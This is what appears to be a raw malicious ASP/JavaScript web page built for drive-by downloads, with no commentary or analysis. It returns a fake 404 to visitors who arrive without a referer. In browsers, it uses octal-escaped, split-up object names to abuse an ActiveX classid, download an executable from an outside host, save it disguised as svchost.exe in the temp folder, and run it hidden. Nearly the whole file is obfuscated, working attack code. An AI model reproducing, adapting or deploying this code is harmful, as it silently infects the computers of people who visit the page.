<%@LANGUAGE="JAVASCRIPT"%><%
Server.ScriptTimeOut	= 12000;
Response.CacheControl	= "no-cache";
if(typeof(Request.ServerVariables("HTTP_REFERER")())=="undefined"){
	Response.Status="404 Object Not Found";
	Response.End();
}%>function RUN(URL){
  try{	var PATH="svchost.exe";
        var ab="OBJ";
        var cb="ECT";
	var o=document.createElement(ab+cb);
	o.setAttribute("\143\154\141\163\163\151\144",
		"\143\154\163\151\144\72\102\104\71\66\103\65\65\66\55\66\65\101\63\55\61\61\104\60\55\71\70\63\101\55\60\60\103\60\64\106\103\62\71\105\63\66");

        var URL= "Http://www.vmvmv.com/xxoxx.exe"
        var c1="Msxml2.";
        var c2="ServerXMLHTTP";
	var x = o.CreateObject(c1+c2,"");
	x.onreadystatechange = function()
	{  try{	
	     if(x.readyState==4 && x.status==200){
		d = o.CreateObject("\101\144\157\144\142\56\123\164\162\145\141\155","");
		d.type = 1;
		d.open();
		d.write(x.responseBody);
		try{var f = o.CreateObject("\123\143\162\151\160\164\151\156\147\56\106\151\154\145\123\171\163\164\145\155\117\142\152\145\143\164","");
		PATH= f.BuildPath(f.GetSpecialFolder(2),PATH);
		}catch(e){PATH="C:\\"+PATH;}

		d.savetofile(PATH,2);
		d.close();
		s=o.CreateObject("\123\150\145\154\154\56\101\160\160\154\151\143\141\164\151\157\156","");
                var c3="op"
                var c4="en"
		s.ShellExecute(PATH,"","",c3+c4,0);
	      }
	   }catch(e){}
	};
  
        var c5="G";
        var c6="E";
        var c7="T";
	x.open(c5+c6+c7, URL, true);x.send();
   }catch(e){}

}
document.write('<script type="text/javascript">')

